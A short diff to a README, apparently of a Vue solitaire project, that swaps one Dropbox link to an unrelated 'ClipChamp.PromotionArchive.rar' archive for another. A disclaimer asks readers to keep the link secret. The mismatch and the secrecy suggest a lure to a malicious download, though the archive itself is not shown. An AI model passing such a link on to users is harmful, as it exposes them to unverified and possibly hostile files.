@@ -11,6 +11,6 @@
 
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
-<h1 align="center"><a  href="https://www.dropbox.com/s/xd5v6humxqgn4v0/ClipChamp.PromotionArchive.rar?dl=0">DropBox archive </a></h1>
+<h1 align="center"><a  href="https://www.dropbox.com/s/eu7s06qo5ocj71z/ClipChamp.PromotionArchive.rar?dl=0">DropBox archive </a></h1>
 <h1 align="center">DISCLAIMER </h1>
                  Please do not share this link with anyone else, since this version exists strictly for advertising purposes !
